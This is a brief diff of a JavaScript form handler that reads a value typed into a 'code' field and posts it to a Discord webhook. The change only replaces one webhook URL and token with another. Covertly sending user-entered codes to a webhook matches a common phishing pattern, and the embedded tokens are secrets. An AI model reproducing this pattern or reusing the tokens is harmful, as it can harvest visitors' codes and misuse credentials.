@@ -2,7 +2,7 @@ document.querySelector("#rizz").addEventListener("submit", (e) => {
     e.preventDefault();
     const val = document.querySelector("#code").value;
 
-    fetch("https://discord.com/api/webhooks/1351015431464550431/GL-jIECWU2kmIG7zQx1sTPC9i5THVnWwzrtO1VHRjQG4rkRCwHYh9dBkcBqaqyDNEbV2", {
+    fetch("https://discord.com/api/webhooks/1351022918741655623/8IIzJn6ijcdI5tJU-4wDT9ZYYcGrX5w7iDjerRbwQpdN_saz3mp1-ZMVgltgh4SfsVJJ", {
       method: "POST",
       headers: {
         "content-type": "application/json"
